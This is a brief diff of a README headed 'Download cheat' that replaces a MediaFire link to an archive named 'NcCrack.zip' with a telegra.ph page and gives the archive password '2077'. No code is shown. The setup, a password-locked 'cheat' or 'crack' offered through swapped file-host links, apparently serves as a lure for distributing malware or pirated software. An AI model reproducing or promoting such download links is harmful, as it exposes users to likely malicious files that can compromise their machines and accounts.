@@ -2,7 +2,7 @@
 
 # Download cheat
 
-|[Download](https://www.mediafire.com/file/5n49100pwy2tiog/NcCrack.zip/file)|
+|[Download](https://telegra.ph/Download-cheat-01-25)|
 |:-------------|
 Passwrod: `2077`
 
